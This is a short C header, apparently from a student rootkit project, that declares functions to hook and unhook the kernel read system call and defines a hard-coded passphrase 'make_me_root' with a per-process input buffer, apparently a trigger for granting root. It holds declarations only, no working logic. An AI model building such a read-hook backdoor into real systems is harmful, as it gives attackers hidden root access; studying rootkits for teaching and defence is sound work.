#ifndef _GROUP7_READ_H
#define _GROUP7_READ_H

#define PASSPHRASE          "make_me_root"
#define PASSHPHRASE_LEN     12
#define MAX_BUF             23 //We never need to save more than 23 Bytes


void handle_pid(pid_t, __user char *, size_t);
void hook_read(void);
void unhook_read(void);

struct pid_entry {
    pid_t pid;
    char *str;
    int capacity;
    int iter;
    struct hlist_node hlist;
};


#endif//_GROUP7_READ_H